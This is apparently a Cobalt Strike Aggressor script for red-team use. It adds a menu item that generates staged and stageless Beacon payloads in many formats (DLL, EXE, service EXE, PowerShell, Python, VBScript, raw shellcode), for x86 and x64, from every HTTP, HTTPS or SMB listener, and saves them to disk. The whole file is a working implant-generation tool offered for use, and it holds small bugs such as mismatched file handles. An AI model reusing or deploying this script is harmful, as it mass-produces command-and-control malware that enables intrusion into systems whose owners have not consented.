#Automatic Artifact Payload Generator
#Author: @r3dQu1nn
#Modified: @seahop
#Notes: Added x86 and x64 creation of each listener type

#Generates every type of Stageless/Staged Payload based off a HTTP/HTTPS Listener

#Custom Directory for Payloads
mkdir("/redteam/tools/cobaltstrike/Staged_Payloads");
mkdir("/redteam/tools/cobaltstrike/Stageless_Payloads");

menubar("Payload Generator", "payloadgenerator");
popup payloadgenerator {
	item "&Automatic Artifact Payload Generator" {
		prompt_confirm("Do you want to generate all the different types of Artifacts?", "Payload Generator Confirmation", {
			show_message("Generating Artifacts...");
			payloadgenerate();
			show_message("Check /redteam/tools/cobaltstrike/ for Staged and Stageless Payloads");
		});
	}
}

sub payloadgenerate {
	
	foreach $name (listeners_local()) {
	$original_listener = $name;
	$listener_name = lc($name);
        if ($listener_name hasmatch "http" || $listener_name hasmatch "https" || $listener_name hasmatch "smb") {
	
		#Staged Payloads
		$data1 = artifact_stager($original_listener, "dll", "x86");
		$data2 = artifact_stager($original_listener, "exe", "x86");
		$data3 = artifact_stager($original_listener, "powershell", "x86");
		$data4 = artifact_stager($original_listener, "python", "x86");
		$data5 = artifact_stager($original_listener, "svcexe", "x86");
		$data6 = artifact_stager($original_listener, "vbscript", "x86");
		$data7 = artifact_stager($original_listener, "raw", "x86");
		$data19 = artifact_stager($original_listener, "dll", "x64");
		$data20 = artifact_stager($original_listener, "exe", "x64");
		$data21 = artifact_stager($original_listener, "python", "x64");
		$data22 = artifact_stager($original_listener, "svcexe", "x64");
		$data23 = artifact_stager($original_listener, "vbscript", "x64");
		$data24 = artifact_stager($original_listener, "raw", "x64");

	        #Write and Save Payloads
	        $handle = openf(">/redteam/tools/cobaltstrike/Staged_Payloads/" . $name . "_x86_DLL.dll");
		writeb($handle, $data1);
		closef($handle);
		$handle2 = openf(">/redteam/tools/cobaltstrike/Staged_Payloads/" . $name . "_x86_EXE.exe");
		writeb($handle2, $data2);
		closef($handle2);
		$handle3 = openf(">/redteam/tools/cobaltstrike/Staged_Payloads/" . $name . "_x86_POWERSHELL.ps1");
		writeb($handle3, $data3);
		closef($handle3);
		$handle4 = openf(">/redteam/tools/cobaltstrike/Staged_Payloads/" . $name . "_x86_PYTHON.py");
		writeb($handle4, $data4);
		closef($handle4);
		$handle5 = openf(">/redteam/tools/cobaltstrike/Staged_Payloads/" . $name . "_x86_SVC.exe");
		writeb($handle5, $data5);
		closef($handle5);
		$handle6 = openf(">/redteam/tools/cobaltstrike/Staged_Payloads/" . $name . "_x86_VBS.vbs");
		writeb($handle6, $data6);
		closef($handle6);
		$handle7 = openf(">/redteam/tools/cobaltstrike/Staged_Payloads/" . $name . "_x86_RAW.bin");
		writeb($handle7, $data7);
		closef($handle7);
		$handle8 = openf(">/redteam/tools/cobaltstrike/Staged_Payloads/" . $name . "_x64_DLL.dll");
		writeb($handle8, $data19);
		closef($handle8);
		$handle9 = openf(">/redteam/tools/cobaltstrike/Staged_Payloads/" . $name . "_x64_EXE.exe");
		writeb($handle9, $data20);
		closef($handle9);
		$handle10 = openf(">/redteam/tools/cobaltstrike/Staged_Payloads/" . $name . "_x64_PYTHON.py");
		writeb($handle10, $data21);
		closef($handle9);
		$handle11 = openf(">/redteam/tools/cobaltstrike/Staged_Payloads/" . $name . "_x64_SVC.exe");
		writeb($handle11, $data22);
		closef($handl11);
		$handle12 = openf(">/redteam/tools/cobaltstrike/Staged_Payloads/" . $name . "_x64_VBS.vbs");
		writeb($handle12, $data23);
		closef($handle12);
		$handle13 = openf(">/redteam/tools/cobaltstrike/Staged_Payloads/" . $name . "_x64_RAW.bin");
		writeb($handle13, $data24);
		closef($handle13);

		#Stageless Payloads
		$data8 = artifact_payload($original_listener, "dll", "x64");
	        $data9 = artifact_payload($original_listener, "exe", "x86");
	        $data10 = artifact_payload($original_listener, "python", "x86");
	        $data11 = artifact_payload($original_listener, "powershell", "x86");
	        $data12 = artifact_payload($original_listener, "raw", "x86");
	        $data13 = artifact_payload($original_listener, "svcexe", "x86");
		$data14 = artifact_payload($original_listener, "dll", "x86");
		$data15 = artifact_payload($original_listener, "exe", "x64");
		$data16 = artifact_payload($original_listener, "python", "x64");
		$data17 = artifact_payload($original_listener, "raw", "x64");
		$data18 = artifact_payload($original_listener, "svcexe", "x64");
		$data25 = artifact_payload($original_listener, "powershell", "x64");	        
		$data26 = artifact_payload($original_listener, "vbscript", "x86");
		$data27 = artifact_payload($original_listener, "vbscript", "x64");

	        #Write and Save Payloads
		$cradle1 = openf(">/redteam/tools/cobaltstrike/Stageless_Payloads/" . $name . "_x64_DLL.dll");
		writeb($cradle1, $data8);
		closef($cradle1);
		$cradle2 = openf(">/redteam/tools/cobaltstrike/Stageless_Payloads/" . $name. "_x86_EXE.exe");
		writeb($cradle2, $data9);
		closef($cradle2);
		$cradle3 = openf(">/redteam/tools/cobaltstrike/Stageless_Payloads/" . $name . "_x86_POWERSHELL.ps1");
		writeb($cradle3, $data11);
		closef($cradle3);
		$cradle4 = openf(">/redteam/tools/cobaltstrike/Stageless_Payloads/" . $name . "_x86_RAW.bin");
		writeb($cradle4, $data12);
		closef($cradle4);
		$cradle5 = openf(">/redteam/tools/cobaltstrike/Stageless_Payloads/" . $name . "_x86_PYTHON.py");
		writeb($cradle5, $data10);
		closef($cradle5);
		$cradle6 = openf(">/redteam/tools/cobaltstrike/Stageless_Payloads/" . $name . "_x86_SVC.exe");
		writeb($cradle6, $data13);
		closef($cradle6);
		$cradle7 = openf(">/redteam/tools/cobaltstrike/Stageless_Payloads/" . $name . "_x86_DLL.dll");
		writeb($cradle7, $data14);
		closef($cradle7);
		$cradle8 = openf(">/redteam/tools/cobaltstrike/Stageless_Payloads/" . $name . "_x64_EXE.exe");
		writeb($cradle8, $data15);
		closef($cradle8);
		$cradle9 = openf(">/redteam/tools/cobaltstrike/Stageless_Payloads/" . $name . "_x64_PYTHON.py");
		writeb($cradle9, $data16);
		closef($cradle9);
		$cradle10 = openf(">/redteam/tools/cobaltstrike/Stageless_Payloads/" . $name . "_x64_RAW.bin");
		writeb($cradle10, $data17);
		closef($cradle10);
		$cradle11 = openf(">/redteam/tools/cobaltstrike/Stageless_Payloads/" . $name . "_x64_SVC.exe");
		writeb($cradle11, $data18);
		closef($cradle11);
		$cradle12 = openf(">/redteam/tools/cobaltstrike/Stageless_Payloads/" . $name . "_x86_VBS.vbs");
		writeb($cradle12, $data26);
		closef($cradle12);
		$cradle13 = openf(">/redteam/tools/cobaltstrike/Stageless_Payloads/" . $name . "_x64_VBS.vbs");
		writeb($cradle13, $data27);
		closef($cradle13);
		}
	}
}
